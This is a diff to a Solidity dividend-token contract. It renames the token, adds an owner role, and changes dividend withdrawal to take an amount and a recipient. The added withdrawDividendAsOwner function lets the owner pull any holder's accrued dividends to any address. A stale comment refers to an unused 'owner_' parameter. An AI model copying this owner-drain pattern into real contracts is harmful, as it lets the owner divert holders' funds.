@@ -5,10 +5,18 @@ pragma solidity ^0.8.20;
 /// @notice Each token represents a share of contract income (ETH received).
 ///         Dividends are claimable and not automatically sent, ensuring precise accounting on transfer.
 contract FeemakerHolders {
-    string public name = "FeemakerHolders";
-    string public symbol = "FMH";
+    string public name = "Feemaker Holders";
+    string public symbol = "SHARE";
     uint8 public decimals = 18;
     uint256 public totalSupply;
+
+    /// @notice Contract owner for privileged operations.
+    address public owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "not owner");
+        _;
+    }
 
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
@@ -31,6 +39,7 @@ contract FeemakerHolders {
     event DividendWithdrawn(address indexed to, uint256 weiAmount);
 
     constructor(uint256 initialSupply) {
+        owner = msg.sender;
         _mint(msg.sender, initialSupply);
     }
 
@@ -44,14 +53,14 @@ contract FeemakerHolders {
     }
 
     /// @notice Returns the remaining number of tokens that `spender` is allowed to spend on behalf of `owner`.
-    /// @param owner The address which owns the tokens.
+    /// @param _owner The address which owns the tokens.
     /// @param spender The address which will spend the tokens.
     /// @return The remaining allowance for `spender`.
     function allowance(
-        address owner,
+        address _owner,
         address spender
     ) public view returns (uint256) {
-        return _allowances[owner][spender];
+        return _allowances[_owner][spender];
     }
 
     /// @notice Approves `spender` to transfer up to `amount` tokens from the caller's account.
@@ -163,15 +172,51 @@ contract FeemakerHolders {
             ) / MAGNITUDE;
     }
 
-    /// @notice Withdraws the caller's currently withdrawable dividends.
-    /// @dev Updates `withdrawnDividends` and transfers ETH to the caller.
-    function withdrawDividend() public {
-        uint256 withdrawable = withdrawableDividendOf(msg.sender);
-        if (withdrawable > 0) {
-            withdrawnDividends[msg.sender] += withdrawable;
-            (bool success, ) = msg.sender.call{value: withdrawable}("");
-            require(success, "ETH transfer failed");
-            emit DividendWithdrawn(msg.sender, withdrawable);
+    /// @notice Withdraw dividends accrued by the caller.
+    /// @dev If `amount` is 0, withdraw the full available amount. Funds are sent to `to`.
+    /// @param amount The amount to withdraw; 0 means withdraw all available.
+    /// @param to The recipient address to receive withdrawn ETH.
+    function withdrawDividend(uint256 amount, address to) public {
+        _withdrawDividend(msg.sender, to, amount);
+    }
+
+    /// @notice Owner-initiated withdrawal on behalf of `sender`.
+    /// @dev If `amount` is 0, withdraw the full available amount for `sender`.
+    /// @param sender The account whose dividends will be withdrawn.
+    /// @param to The recipient address to receive withdrawn ETH.
+    /// @param amount The amount to withdraw; 0 means withdraw all available.
+
+    function withdrawDividendAsOwner(
+        address sender,
+        address to,
+        uint256 amount
+    ) public onlyOwner returns (bool) {
+        _withdrawDividend(sender, to, amount);
+        return true;
+    }
+
+    /// @dev Generic internal withdrawal implementation.
+    /// @param sender_ The logical sender whose dividends are withdrawn.
+    /// @param to The recipient of the withdrawn ETH.
+    /// @param amount The amount to withdraw; 0 means withdraw all available
+    function _withdrawDividend(
+        address sender_,
+        address to,
+        uint256 amount
+    ) private {
+        // owner_ is currently unused but kept for genericity per interface requirement
+        require(to != address(0), "zero recipient");
+
+        uint256 withdrawable = withdrawableDividendOf(sender_);
+        uint256 payout = amount == 0 ? withdrawable : amount;
+        if (payout == 0) {
+            return; // nothing to withdraw
         }
+        require(payout <= withdrawable, "amount exceeds withdrawable");
+
+        withdrawnDividends[sender_] += payout;
+        (bool success, ) = to.call{value: payout}("");
+        require(success, "ETH transfer failed");
+        emit DividendWithdrawn(to, payout);
     }
 }
